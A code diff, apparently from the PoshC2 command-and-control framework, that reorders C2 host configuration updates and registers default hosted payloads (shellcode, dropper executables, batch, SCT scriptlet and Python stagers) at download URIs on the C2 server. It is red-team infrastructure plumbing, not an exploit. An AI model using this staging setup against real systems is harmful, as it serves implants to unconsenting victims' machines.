@@ -399,14 +399,28 @@ def existingdb(db):
             shutil.rmtree("%spayloads_old" % PoshProjectDirectory)
         os.rename("%spayloads" % PoshProjectDirectory, "%spayloads_old" % PoshProjectDirectory)
         os.makedirs("%spayloads" % PoshProjectDirectory)
-        C2 = get_c2server_all()
-        urlId = new_urldetails(f"updated_host-{datetime.datetime.strftime(datetime.datetime.now(), '%Y-%m-%d-%H:%M:%S')}", PayloadCommsHost, C2.DomainFrontHeader, "", "", "", "")
-        newPayload = Payloads(C2.KillDate, C2.EncKey, C2.Insecure, C2.UserAgent, C2.Referrer, get_newimplanturl(), PayloadsDirectory, URLID=urlId)
         update_item("PayloadCommsHost", "C2Server", PayloadCommsHost)
         update_item("QuickCommand", "C2Server", QuickCommand)
         update_item("DomainFrontHeader", "C2Server", DomainFrontHeader)
+        C2 = get_c2server_all()
+        urlId = new_urldetails(f"updated_host-{datetime.datetime.strftime(datetime.datetime.now(), '%Y-%m-%d-%H:%M:%S')}", PayloadCommsHost, C2.DomainFrontHeader, "", "", "", "")
+        newPayload = Payloads(C2.KillDate, C2.EncKey, C2.Insecure, C2.UserAgent, C2.Referrer, get_newimplanturl(), PayloadsDirectory, URLID=urlId)
         newPayload.CreateAll()
         newPayload.WriteQuickstart(PoshProjectDirectory + 'quickstart.txt')
+        
+        # adding default hosted payloads
+        QuickCommandURI = select_item("QuickCommand", "C2Server")
+        insert_hosted_file("%ss/86/portal" % QuickCommandURI, "%sSharp_v4_x86_Shellcode.bin" % (PayloadsDirectory), "text/html", "Yes", "Yes")
+        insert_hosted_file("%ss/64/portal" % QuickCommandURI, "%sSharp_v4_x64_Shellcode.bin" % (PayloadsDirectory), "text/html", "Yes", "Yes")
+        insert_hosted_file("%sp/86/portal" % QuickCommandURI, "%sPosh_v4_x86_Shellcode.bin" % (PayloadsDirectory), "application/x-msdownload", "No", "Yes")
+        insert_hosted_file("%sp/64/portal" % QuickCommandURI, "%sPosh_v4_x64_Shellcode.bin" % (PayloadsDirectory), "application/x-msdownload", "No", "Yes")
+        insert_hosted_file("%s_ex86" % QuickCommandURI, "%sPosh_v4_dropper_32.exe" % (PayloadsDirectory), "application/x-msdownload", "No", "Yes")
+        insert_hosted_file("%s_ex64" % QuickCommandURI, "%sPosh_v4_dropper_64.exe" % (PayloadsDirectory), "application/x-msdownload", "No", "Yes")
+        insert_hosted_file("%s_bs" % QuickCommandURI, "%spayload.bat" % (PayloadsDirectory), "text/html", "No", "Yes")
+        insert_hosted_file("%s_rp" % QuickCommandURI, "%spayload.txt" % (PayloadsDirectory), "text/html", "Yes", "Yes")
+        insert_hosted_file("%s_rg" % QuickCommandURI, "%srg_sct.xml" % (PayloadsDirectory), "text/html", "No", "Yes")
+        insert_hosted_file("%s_cs" % QuickCommandURI, "%scs_sct.xml" % (PayloadsDirectory), "text/html", "No", "Yes")
+        insert_hosted_file("%s_py" % QuickCommandURI, "%saes.py" % (PayloadsDirectory), "text/html", "No", "Yes")
 
 
 def log_c2_messages():
